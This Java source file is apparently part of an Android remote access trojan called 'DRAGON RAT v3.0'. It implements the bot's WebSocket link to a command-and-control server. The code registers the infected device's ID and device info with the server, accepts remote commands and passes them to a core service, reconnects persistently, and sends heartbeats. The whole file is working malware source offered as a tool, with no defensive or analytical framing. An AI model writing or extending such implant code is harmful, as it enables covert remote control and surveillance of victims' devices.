package com.dragon.rat;

import android.util.Log;

import org.java_websocket.client.WebSocketClient;
import org.java_websocket.handshake.ServerHandshake;

import java.net.URI;
import java.util.Map;

/**
 * DRAGON RAT v3.0 — WebSocket Client
 * Persistent connection with automatic reconnect
 * Zero-latency command delivery
 */
public class BotWebSocketClient extends WebSocketClient {
    
    private static final String TAG = "DRAGON-WS";
    private CoreService service;
    private int reconnectAttempts = 0;
    private int maxReconnectAttempts;
    private int reconnectInterval;
    private boolean intentionalClose = false;
    
    public BotWebSocketClient(URI serverUri, CoreService service, 
                               int reconnectInterval, int maxReconnectAttempts) {
        super(serverUri);
        this.service = service;
        this.reconnectInterval = reconnectInterval;
        this.maxReconnectAttempts = maxReconnectAttempts;
        
        // Disable connection timeout (keep alive for days)
        this.setConnectionLostTimeout(30);
    }
    
    @Override
    public void onOpen(ServerHandshake handshakedata) {
        Log.d(TAG, "Connected to C2 server");
        reconnectAttempts = 0;
        
        // Register with server
        String regData = String.format(
            "{\"type\":\"register\",\"botId\":\"%s\",\"data\":%s}",
            FudUtils.getDeviceId(),
            service.getDeviceInfoJson()
        );
        send(regData);
    }
    
    @Override
    public void onMessage(String message) {
        Log.d(TAG, "Command received: " + message);
        if (service != null) {
            service.handleCommand(message);
        }
    }
    
    @Override
    public void onClose(int code, String reason, boolean remote) {
        Log.d(TAG, "Disconnected: " + reason + " (remote: " + remote + ")");
        
        if (!intentionalClose) {
            scheduleReconnect();
        }
    }
    
    @Override
    public void onError(Exception ex) {
        Log.e(TAG, "WebSocket error: " + ex.getMessage());
        if (!intentionalClose) {
            scheduleReconnect();
        }
    }
    
    private void scheduleReconnect() {
        if (maxReconnectAttempts > 0 && reconnectAttempts >= maxReconnectAttempts) {
            Log.e(TAG, "Max reconnection attempts reached");
            return;
        }
        
        reconnectAttempts++;
        
        // Exponential backoff with cap
        int delay = Math.min(reconnectInterval * reconnectAttempts, 60000);
        
        new android.os.Handler().postDelayed(() -> {
            if (!isOpen() && !intentionalClose) {
                Log.d(TAG, "Reconnecting (attempt " + reconnectAttempts + ")...");
                reconnect();
            }
        }, delay);
    }
    
    public void closeGracefully() {
        intentionalClose = true;
        close();
    }
    
    public void sendHeartbeat(String batteryJson) {
        if (isOpen()) {
            String msg = String.format(
                "{\"type\":\"pong\",\"botId\":\"%s\",\"data\":%s}",
                FudUtils.getDeviceId(),
                batteryJson
            );
            send(msg);
        }
    }
}
